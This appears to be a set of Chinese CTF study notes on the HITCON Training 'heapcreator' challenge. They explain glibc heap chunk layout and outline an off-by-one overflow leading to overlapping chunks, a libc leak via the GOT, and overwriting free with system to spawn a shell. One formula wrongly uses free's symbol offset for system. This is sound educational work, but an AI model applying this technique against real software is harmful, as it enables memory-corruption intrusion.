<h3 class="topic">
<a name="4l1bhdcc7c6ubkc6uee5m0t9qe">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3g28vm56nglj013j5hjsekqui5.png"></p>
<h3 class="topic">
<a name="5pvn5oe9j9fn69vmunsrvj1cav">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里推测read_input函数第一个参数表示读取的目的地址，第二个参数表示读取的字节数 1ll 推测为 longlong 数据类型的1 所以这允许从命令行中读取的数据的大小比堆空间应有大小多1，会造成一个字节的溢出</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7j5a01hpum3r497cvhlfbr1023.png"></p>
<h3 class="topic">
<a name="7rk6cqc2avol6ia48d45gjmd9v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于show_heap函数</a>
</h3>
<h3 class="topic">
<a name="26bbtota0tqjllm11h0teirbp4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show函数中检查了堆块是否存在</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3qq3m9981pij6std4v87d50mq9.png"></p>
<h3 class="topic">
<a name="6tb01qedbh6e7gk84le4bj0cv5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于delete_heap函数</a>
</h3>
<h3 class="topic">
<a name="3m12ur1khresvtkg5b9n0a83oq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0nfve3hglvflu5ng1on4k5tl5d.png"></p>
<h3 class="topic">
<a name="7kfebt8f2ugf2jh29t12671e8g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7fpppnnah29vdl21gb42hlhpr7.png"></p>
<h3 class="topic">
<a name="7dli8c577b4v4php1qh9rn9852">&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用思路</a>
</h3>
<h3 class="topic">
<a name="7g319fs93ot0li2n6ar3d64fim">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先需要补充一些关于堆结构的知识</a>
</h3>
<h3 class="topic">
<a name="4vr974tg34i2cgnm1optamujlb">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参考资料</a>
</h3>
<h3 class="topic">
<a href="https://wiki.x10sec.org/pwn/heap/heap_structure/#_2" name="296mbt9hdjde9fqd8nam00gotf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://wiki.x10sec.org/pwn/heap/heap_structure/#_2</a>
</h3>
<h3 class="topic">
<a name="7rutne2b0arvk8lclfqlfvsetn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;预备知识</a>
</h3>
<h3 class="topic">
<a name="1vfgd4gkbmd3epdh7a26bl5pam">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;64位系统中size_t为64位无符号数（8字节） &#13;
32位系统中size_t为32位无符号数（四字节）</a>
</h3>
<h3 class="topic">
<a name="69dmkf664tsfrb6h338on9pn7v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;malloc_chunk</a>
</h3>
<h3 class="topic">
<a name="3q7eiqf07tu004uphsk33ahom6">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个chunk就是malloc在内存中申请的一个内存块，该内存块使用malloc_chunk结构体表示（已经分配或已经释放的堆空间均用该结构体表示）</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4o56k1e3q9fpvp2lifqjr8p0ba.png"></p>
<h3 class="topic">
<a name="7scqjs1dadvalksdm8ubrqfco9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk的结构，进行进一步的分析</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6atlfnh7acv15s8dqaf4fkfamn.png"></p>
<h3 class="topic">
<a name="1ogmv2shqr4t4s4v5uvuv7bl8f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev_size</a>
</h3>
<h3 class="topic">
<a name="2lo3j44tlj89jcl9vb7anbc3q5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev_size, 如果该 chunk 的物理相邻的前一地址chunk（两个指针的地址差值为前一chunk大小）是空闲的话，那该字段记录的是前一个 chunk 的大小(包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个chunk 的数据。</a>
</h3>
<h3 class="topic">
<a name="4jh9v9np1gnfuquma2e8cdrr0n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只有当前一个chunk用户空间的大小不能被2*sizeof（size_t）整除时（在64位中即不能被16整除，32位中即不能被8整除），才会将本chunk的prev_size当作自己的内容区域</a>
</h3>
<h3 class="topic">
<a name="4kncvn699m3uk9pjf5u9vv5q6s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里的前一chunk 指的是较低地址的 chunk 。</a>
</h3>
<h3 class="topic">
<a name="7tsvkaa2lp785upb4r3bdbuidf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size</a>
</h3>
<h3 class="topic">
<a name="4lk0amv9lt00qr3kit87tngc6v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该 chunk 的大小（包括chunk头），大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8,（SIZE_SZ=sizeof（size_t）） </a>
</h3>
<h3 class="topic">
<a name="02fva8betj8djb6gsp2sseg78h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为malloc实现分配的内存空间是8字节对齐的，所以该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示（注意这里的由高到低指的是数据的高位低位，而不是地址的高位低位，因为地址是以字节为单位分配的，与bit无关）</a>
</h3>
<h3 class="topic">
<a name="41pkngl56s1k4fk3erkq5iau69">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于。位于数据高地址</a>
</h3>
<h3 class="topic">
<a name="6hrm83gascrpfsnhcaqhgf4f8m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 位于数据中间地址</a>
</h3>
<h3 class="topic">
<a name="0ko2ms32to7a2fvj5hils1cqm3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的P位都会被设置为1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并。位于数据低地址</a>
</h3>
<h3 class="topic">
<a name="5f92nua25jc41kscb2rjt6uk7a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前一个chunk块被使用-》1&#13;
前一个chunk块被释放-》0</a>
</h3>
<h3 class="topic">
<a name="07f3b42f557bku1s805h81rqtp">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;prev_size 和 size都是 INTERNAL_SIZE_T类型的数据，而根据# define INTERNAL_SIZE_T size_t，可以直到INTERNAL_SIZE_T即为size_t</a>
</h3>
<h3 class="topic">
<a name="0omgqimuf00qgapui2uh5gonfl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;size_t在64位中占8字节  在32位中占4字节，说明对于64位中的chunk，其chunk头的大小为16字节，32位chunk中chunk头大小为8字节</a>
</h3>
<h3 class="topic">
<a name="3fnhinb50d3npqcd1l5eha8s7s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd bk</a>
</h3>
<h3 class="topic">
<a name="3h2tdaoqfj2c96f75vdgfkjtjo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</a>
</h3>
<h3 class="topic">
<a name="0f5ra8ll66udm3846p11bsq9m8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd 指向下一个（非物理相邻）空闲的 chunk&#13;
bk 指向上一个（非物理相邻）空闲的 chunk&#13;
通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</a>
</h3>
<h3 class="topic">
<a name="7rhe823jjbejlrch27u37u1u2u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd_nextsize， bk_nextsize</a>
</h3>
<h3 class="topic">
<a name="7duhjvnc3dnn7m21orsc135r1n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</a>
</h3>
<h3 class="topic">
<a name="5qah55gneg491f2vjctkufhdba">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。&#13;
bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。&#13;
一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk 时挨个遍历。</a>
</h3>
<h3 class="topic">
<a name="6bpr6nbtj5jr3a18qkbtpaa672">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于一个已经分配的chunk 其前两个字段称为chunk header，之后的部分称为user data ，malloc申请返回的内存指针指向user data起始处</a>
</h3>
<h3 class="topic">
<a name="37pqls24ibfimo7taglbla9gdn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当一个chunk使用时，其后一个chunk中的prev_size字段无效，可以被当作当前chunk的user data部分使用，不过前提是当前chunk申请的可用内存大小不能被2*sizeof（size_t）整除，在64位中即不能被16整除，32位中即不能被8整除</a>
</h3>
<h3 class="topic">
<a name="5ee7b8p1ifuk2rrokfghgnlh9q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个使用中的chunk</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6ne3nj4d6tismtk39kj3eh4q85.png"></p>
<h3 class="topic">
<a name="0optp26mkfckan201pkh8qmm3o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个被释放的chunk</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2buuj2odmj1oo67n4pngnee0om.png"></p>
<h3 class="topic">
<a name="6csrjm4gt9q2l6pn98ecphh8uk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个空闲的chunk的大小会被在两个地方记录，1、本chunk块中的size 2、后一个chunk块中的prev_size</a>
</h3>
<h3 class="topic">
<a name="19glbp7kha3r0ljtajtcl6enco">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一般情况下，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。</a>
</h3>
<h3 class="topic">
<a name="5j1fvkermpqft5gm9sb2serjuc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</a>
</h3>
<h3 class="topic">
<a name="43ocgh8kjjjqqldh21injt3lhc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32位中即为8字节64位中即为16字节</a>
</h3>
<h3 class="topic">
<a name="1dm2qvak2f8j6431fbvs9hh5ig">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;针对chunk块实例进行分析</a>
</h3>
<h3 class="topic">
<a name="1lo137cohd6b410nbbitrhrm9h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于这种堆块申请（64位）</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4l3lkhu78lu6gguboijft2dmnr.png"></p>
<h3 class="topic">
<a name="7slba5hqs01ujcdob9tl6h1pll">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内存中结构为</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2pbdscsmu0qemhn2odb2eun3js.png"></p>
<h3 class="topic">
<a name="7e44blmgjfcikvsav7167hhlg4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到size字段对应的值0x21 对应二进制的 &#13;
0010 0001 最后一位1表示前一个chunk正在被使用（第一个chunk的该位也是1），当前chunk的size值是通过将0010 0001后三bit位置0得到的，即0010 0000，即32字节，正好表示当前chunk的大小：16字节的chunk头（因为是64位系统） 16字节的user data</a>
</h3>
<h3 class="topic">
<a name="4mfucus0u8a8jlg3f7li4jc3qt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于这种堆块申请（64位）</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3bu7o3llj8pee8b7aofvljql9i.png"></p>
<h3 class="topic">
<a name="1s46ns6kdp49p6vnnk7dak3meo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内存中结构为 注意要安装Pwngdb插件才能使用parseheap</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3lhhleeclkibl0qkgd30ib0aj9.png"></p>
<h3 class="topic">
<a name="6935e5e8svbi8bdakco2gl4u07">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于申请0x18字节（24字节）的堆空间，其chunk的size字段为0x21，即0010 0001，对应的chunk块大小为32字节，除去16字节的chunk头，use data大小为16字节</a>
</h3>
<h3 class="topic">
<a name="6n7ng8rok1ke1mg6lqcm0hi7ht">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之前对size字段的描述(如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数),在64位系统中，即如果申请的字节数不是16的整数倍，就会别转化为满足大小的最小的16的倍数，此时申请24字节的空间，24不是16的倍数，所以这里chunk的大小被转换为32（其中chunk头和use data各16字节）</a>
</h3>
<h3 class="topic">
<a name="550a6gmuctjhl7p8pmr43f8j60">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;又因为本chunk申请空间字节数（24字节）不能被16整除（2*sizeof（size_t））所以会使用后一个chunk的prev_size字段作为本chunk的user data，这样本chunk的user data就可以为24字节（16+8）</a>
</h3>
<h3 class="topic">
<a name="0tf54lccidmpadns4kv80bjtgh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样本chunk24字节（0x18字节）之后的内存即为下一个chunk的size，可以利用off by one漏洞将size数据溢出，然后使用堆扩展的漏洞利用技巧</a>
</h3>
<h3 class="topic">
<a name="7t2fd4rb8k530qqp6d7pvpf34l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于申请0x20字节堆空间对应的chunk，因为其user data后面跟着的是prev_size 而不是size，所以无法通过off by one漏洞利用</a>
</h3>
<h3 class="topic">
<a name="5quiu4mf4csgu6vvs3l3rak4kc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于申请0x20字节（32字节）堆空间情况来说，其对应chunk块的size为0x31，即0011 0001 则size实际为32+16=48字节（即忽略最后一bit的1）即16字节的chunk头+32字节的userdata</a>
</h3>
<h3 class="topic">
<a name="2qa4lvfbbidh2aeuk6m6koe64n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为此次申请32字节的内存，符合2+SIZE_SZ的整数倍，所以不将下一个chunk的prev_size当作本chunk的user data使用</a>
</h3>
<h3 class="topic">
<a name="33qp0h0jq265cor489udvglo2g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以使用vmmap查区段信息</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/65u22l217qh8gnarmiab8i3qs2.png"></p>
<h3 class="topic">
<a name="2m2qpsvgkvuqgspvhjhoertvsf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;也可以使用gef插件的heap chunks查找当前程序中的chunk</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/4cj8s44qs3prmhus7kv9s6glbv.png"></p>
<h3 class="topic">
<a name="279bbeg4mmkv60f6b1fv60rpbd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gef中仍可以使用vmmap查看当前内存状态</a>
</h3>
<h3 class="topic">
<a name="7v1tae7unepog26l3281nfs0u0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前的思路</a>
</h3>
<h3 class="topic">
<a name="2ts61j77iabu385dcdfsbvm6cg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3cjgq4rjh8knejncivc1gg2n71.png"></p>
<h3 class="topic">
<a name="6sco55s7hlr4v9bol1hmnfd0rc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7nc4t05iecmur9da1mrgmi0cpn.png"></p>
<h3 class="topic">
<a name="3hqr9bb79g53orf0ff9gkp6eu9">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里可能写错了，如果malloc ，会多分配0x8字节的prev_size,而不是0x80</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/3qvjr8es4bun6ql123p7kcka9b.png"></p>
<h3 class="topic">
<a name="3rt8ou9e0jkvft6kt0k0ul6n0q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6bqj380qn3u5ahlr83re86gfpe.png"></p>
<h3 class="topic">
<a name="0sr5mcupu0mjn4qh7st4dv252v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据程序中create_heap函数，每当创建一个堆块，首先会申请0x10字节的堆空间，该堆空间存放结构体block，然后会根据你输入的size大小申请相同大小的堆空间用于存放内容，我们称这块堆内存为context，block中的size用于描述后者的大小，char *context用于指向后者堆空间首地址</a>
</h3>
<h3 class="topic">
<a name="54vsb6ppn4gpmtnik9ht3q33r1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以当在程序中创建一个堆时，内存中实际结构为&#13;
block0&#13;
context0&#13;
如果连续创建两个堆块，则内存中为&#13;
block0&#13;
context0&#13;
block1&#13;
context2&#13;
（这里隐含一个问题，申请的这些堆空间一定是连续的吗，如果是为什么呢）（推测原因可能是如果在进程刚开始，第一次申请堆空间是从堆的首地址开始分配的，之后如果要申请的堆空间，则从紧邻已分配的堆的位置开始）</a>
</h3>
<h3 class="topic">
<a name="1n9akh9rdlb2e4202ptnsipbua">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果我们按照作者的思路连续两次申请指定大小堆空间（注意其实block所占堆空间的大小是一定的，即的0x10字节user data+0x10字节chunk头，所以关键其实是申请的context的大小）&#13;
------------------------------------------------------&#13;
第一次申请的context大小为0x18（实际占用内存=0x10个chunk头+0x10个user data+0x8字节的下一个chunk的prev_data）&#13;
-------------------------------------------------------&#13;
第二次申请的context大小为0x10（实际占用内存=0x10chunk头+0x10user data）</a>
</h3>
<h3 class="topic">
<a name="10r8phfqfldl4itk63732u7a5p">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时context0和block1彼此相邻，根据之前的讨论，context0对应的chunk的0x18字节的user data末尾与block1对应的chunk的chunk头中的size字段相邻，通过context0中的内容进行溢出，可以修改block1对应的chunk的大小，作者的思路是将block1对应的chunk的大小修改为0x40，即正好包括了context1的chunk</a>
</h3>
<h3 class="topic">
<a name="20cihfpppv7ff2vtu1dicvr3l3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后利用函数delete_heap将我们第二次申请的堆块释放掉（对应block1和context1结构），在delete_heap函数中，我们看到首先会释放context1对应的堆块，此时空闲链表中就会多出一个user data为0x10的空闲chunk，然后释放bolck1对应堆块，因为block1对应的chunk的大小被溢出修改为0x40，所以空闲链表中会多出一个user_data为0x30字节的空闲chunk（因为chunk头也要占0x10字节）</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/173idae826vb2jdt3tsir2qt7p.png"></p>
<h3 class="topic">
<a name="5fvu1t5fvo5u10fjvk8p413139">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之后我们调用creat_heap函数申请一个0x30字节的堆空间，在creat_heap函数内部，会先为block3申请0x10字节的堆空间，此时，正好空闲链表中存在符合要求的空闲chunk，即原本的context1对应的chuank，即新的block3会占用原本context1的chunk，之后会为context3申请0x30字节的空间，此时空闲链表中也存在符合要求的空闲chunk，即之前释放的block1+context1的chunk，所以context3会占用原本block1+context1的chunk</a>
</h3>
<h3 class="topic">
<a name="2rj3n0ovsr888dsodolng3jc67">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时发生了有趣的事，context3包含原有的block1+context1的chunk，而bolck3使用的就是context1原来的chunk，就是说bolck3与context3发生了重合，前者作为后者的一部分，此时block3中存放着一个指针，该指针指向的context3，程序提供editor_heap函数修改context3，如果正好修改到context3中的block3中的指针，则会改变该指针指向的内存，进一步可以通过editor_heap函数修改指针指向的内存数据，即获得了在任意内存地址写任意数据的机会</a>
</h3>
<h3 class="topic">
<a name="26ff0o7j6gasuc7ljrfm6pbhpv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本例中因为relro没有设置为full，所以GOT表是可写的，所以我们可以将GOT表中free函数的地址修改为系统调用int 80的地址，至于参数传递，因为在delete_heap函数中会调用free(*(heaparray[v1]+1))&#13;
函数，说明free会以context3首地址作为参数，所以可以将"bin/sh"字符串保存到context3中作为参数，即可调用system("bin/sh")从而获得shell</a>
</h3>
<h3 class="topic">
<a name="5o58tjtkg8b8pnf2vgpcjjrthc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/0s7f9n1jss9gacg1k1oootns8r.png"></p>
<h3 class="topic">
<a name="75f8ae30gdgna2nd45me1rrs3q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/1ft1el7sm3g151af4nif99bn9a.png"></p>
<h3 class="topic">
<a name="097flqr2caobtok3glk56noh75">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本题还是要注意一点，虽然可执行程序没有开启pie。但是可执行程序中也没有使用到system()函数，system位于libc中，libc本身又是开启所有保护的，所以在将sysytem函数地址写入got_free过程中面临两个问题</a>
</h3>
<h3 class="topic">
<a name="0tj2jqq33m6ngi1r7ceb9ekdjf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何确定free函数在got表中对应的表项地址</a>
</h3>
<h3 class="topic">
<a name="7keto9fk1sd26hnoiqumbcejho">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过elf.got['free']</a>
</h3>
<h3 class="topic">
<a name="4dtaerpvbbeg7bpruiac30tknv">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何确定system函数在libc中的内存地址</a>
</h3>
<h3 class="topic">
<a name="78iomvscn26f5qo6jia8jbe3jc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这就需要泄露一个libc中函数的内存地址，此处可以泄露free函数的地址，然后用&#13;
libc加载基址=free函数地址-lib.symbols['free']&#13;
system函数地址=libc加载基址+lib.symbol['free']</a>
</h3>
<h3 class="topic">
<a name="7c014vl5b9cun8g0acnr2r7d0m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为可执行程序中使用到了free函数，所以elf.got['free']可以获得free函数对应的got表项地址，该地址存储的就是free函数的地址，所以可以通过溢出将block中的指向context的指针覆盖为elf.got['free']，然后通过show函数输出free函数地址</a>
</h3>
<h3 class="topic">
<a name="4smouevapdkn56frh8gndn1n5f">&nbsp;&nbsp;&nbsp;实例分析文章</a>
</h3>
<h3 class="topic">
<a name="79680osdg682g0nq41hd2k8i8a">&nbsp;&nbsp;&nbsp;&nbsp;本题为HITCON Trainging lab13 heapcreator</a>
</h3>
<h3 class="topic">
<a href="https://bbs.pediy.com/thread-247110.htm" name="4qgkhd5s2d79luhp3savvnv2e8">&nbsp;&nbsp;&nbsp;&nbsp;https://bbs.pediy.com/thread-247110.htm</a>
</h3>
<h3 class="topic">
<a href="https://www.cnblogs.com/pfcode/p/10735209.html" name="5pssaranjolks3qjgtcmhf7e6r">&nbsp;&nbsp;&nbsp;&nbsp;https://www.cnblogs.com/pfcode/p/10735209.html</a>
</h3>
<h3 class="topic">
<a name="27v8qcau3etnrcg6qkrh1onvva">&nbsp;分析内存中堆结构</a>
</h3>
<h3 class="topic">
<a name="5cudampje1eo09hekus5idaih1">&nbsp;&nbsp;以本题为例，在程序申请了来两次堆，&#13;
第一次申请0x18（24）字节的堆空间，堆块内容设置为0x18字节的1 （对应图中的block0 context0）&#13;
第二次申请0x20（32）字节的堆空间，堆块内容设置为0x20字节的2 （对应图中的block1 context1）&#13;
最终堆空间的内存如下</a>
</h3>
<h3 class="topic">
<a name="03qrqt5epodrb1nl0l94gta949">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/7vot9r6e1l72i34cdpjs69fk43.png"></p>
<h3 class="topic">
<a name="0nf8fef0bq7iv481b16kbr452f">&nbsp;&nbsp;&nbsp;&nbsp;从中可以看到 context的最后8个字节的用户空间占用的确实是block0的prev_sieze字段的内存空间，即之前对题目的分析没有问题</a>
</h3>
<h3 class="topic">
<a name="4ltkkou02p8athf6hg4v3jkdcn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据gef中heap chunks输出的信息，我们看到block0、 context0、block1、context1大小分别为0x20、0x20、0x20、0x30，符合上面我们的对chunk大小计算方法的推断</a>
</h3>
<h3 class="topic">
<a name="50jtsc1dlru2ldmitl1mjf1pht">&nbsp;通过在exp中使用 &#13;
p=process('可执行文件名')&#13;
gdb.attach(p)&#13;
从而我们可以在执行exp的过程中对可执行文件下进行调试，观察exp的执行的过程</a>
</h3>
<h3 class="topic">
<a name="5v4rqrb05il8m4fva3ulcbpmo4">&nbsp;&nbsp;exp中创建的4个数据块，每个数据块两个chunks，分别为block和context</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/664dri4o5ff9d6huapl22cjsb8.png"></p>
<h3 class="topic">
<a name="0lvd74i4pb1minj3npnrp6ped9">&nbsp;&nbsp;&nbsp;</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6m61d9fagrd21pjucge5kusnke.png"></p>
<h3 class="topic">
<a name="1r5j8kocbk7ejh11m06fjrb8qr">&nbsp;&nbsp;edit(0, payload)执行前</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/6nbmt8gqa69evu2pjlrjf77cpp.png"></p>
<h3 class="topic">
<a name="3jjacqmqv83jn78uqaio7m7e77">&nbsp;&nbsp;&nbsp;edit(0, payload)执行后</a>
</h3>
<p class="topicImage">
<img src="CTF PWN4_files/2oq9se7iqihatrnrrstacde232.png"></p>
<h3 class="topic">
